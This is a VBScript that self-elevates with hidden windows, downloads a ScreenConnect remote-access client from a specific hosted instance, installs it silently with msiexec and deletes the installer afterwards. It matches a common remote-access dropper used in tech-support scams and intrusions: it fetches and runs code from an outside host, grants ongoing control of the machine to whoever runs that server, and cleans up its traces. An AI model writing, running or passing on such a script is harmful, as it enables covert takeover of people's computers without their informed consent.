Option Explicit

Const msiUrl = "https://homesbfc1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"

Dim objShell, objFSO, tempFolder, msiPath, logPath, http, stream, cmd

Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

' --- Elevate if not Admin ---
If Not IsAdmin() Then
    objShell.Run "powershell -Command ""Start-Process wscript.exe -ArgumentList '" & _
                 WScript.ScriptFullName & "' -Verb RunAs""", 0, False
    WScript.Quit
End If

' --- Prepare temp folder ---
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%") & "\SCInstall"
If Not objFSO.FolderExists(tempFolder) Then
    objFSO.CreateFolder tempFolder
End If

msiPath = tempFolder & "\ScreenConnect.ClientSetup.msi"
logPath = tempFolder & "\ScreenConnectInstall.log"

' --- Download MSI ---
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", msiUrl, False
http.Send

If http.Status <> 200 Then
    WScript.Quit 10
End If

Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1
stream.Write http.ResponseBody
stream.SaveToFile msiPath, 2
stream.Close

' --- Silent Install ---
cmd = "msiexec.exe /i """ & msiPath & """ /qn /norestart /l*v """ & logPath & """"
objShell.Run cmd, 0, True

' --- Cleanup (optional: comment out if you want MSI kept) ---
If objFSO.FileExists(msiPath) Then
    objFSO.DeleteFile msiPath, True
End If

WScript.Quit

' --- Function to check admin ---
Function IsAdmin()
    On Error Resume Next
    Dim test
    test = objShell.Run("cmd /c net session >nul 2>&1", 0, True)
    If test = 0 Then
        IsAdmin = True
    Else
        IsAdmin = False
    End If
End Function